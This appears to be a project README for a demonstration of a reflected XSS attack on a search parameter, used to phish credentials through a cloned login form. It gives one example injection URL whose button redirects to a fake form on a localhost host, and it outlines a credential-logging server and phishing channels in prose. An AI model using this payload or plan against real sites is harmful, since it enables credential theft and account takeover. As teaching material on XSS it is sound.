🧪 Project Flow – Reflected XSS Attack (Credential Theft)
This project demonstrates a Reflected XSS attack that targets a vulnerable search functionality to steal user credentials through social engineering and a fake login form.

🔁 Attack Flow:

Reconnaissance:
The attacker inspects the web application and identifies that the search bar reflects user input directly into the HTML response without sanitization — a key sign of a Reflected XSS vulnerability.

Crafting Malicious Link:
Instead of injecting code into a database, the attacker crafts a malicious URL containing JavaScript or HTML payloads (like fake login buttons) within the q (query) parameter of the URL. This payload renders directly when a user clicks the link.

Example:

bash
Copy
Edit
http://vulnerable.com/search?q=<button onclick="window.location='http://localhost:5001/fake-form.html'">🔒 Login Again</button>
Fake Server Setup:
The attacker sets up a fake backend server (e.g., using Node.js or Python) that listens for incoming POST requests and saves stolen credentials into a file named stolen_credentials.txt.

Fake Login Form Creation:
The attacker clones the legitimate website's login form and hosts it at http://localhost:5001/fake-form.html, making it visually indistinguishable from the real one. This form is linked from the malicious payload in the reflected XSS URL.

Link Delivery (Social Engineering):
The attacker sends the crafted malicious link to potential victims via:

Email phishing campaigns

Social media messages or comments

Messaging apps like WhatsApp, Telegram

Embedded links in forum posts or QR codes

Phishing in Action:
When a legitimate user clicks the link:

The search page reflects the payload from the URL.

A fake button or message appears (e.g., “🔴 Session Expired! Login Again”).

Upon clicking, the fake login form opens, visually identical to the real one.

Credential Theft:
When the victim enters their username and password:

The credentials are silently submitted to the attacker’s fake backend server.

The server logs the data into stolen_credentials.txt.

Post-Exploitation:
Now armed with the victim’s credentials, the attacker can:

Log in as the victim.

Perform unauthorized transactions.

Access private data.

Impersonate the user within the system or on other linked platforms.
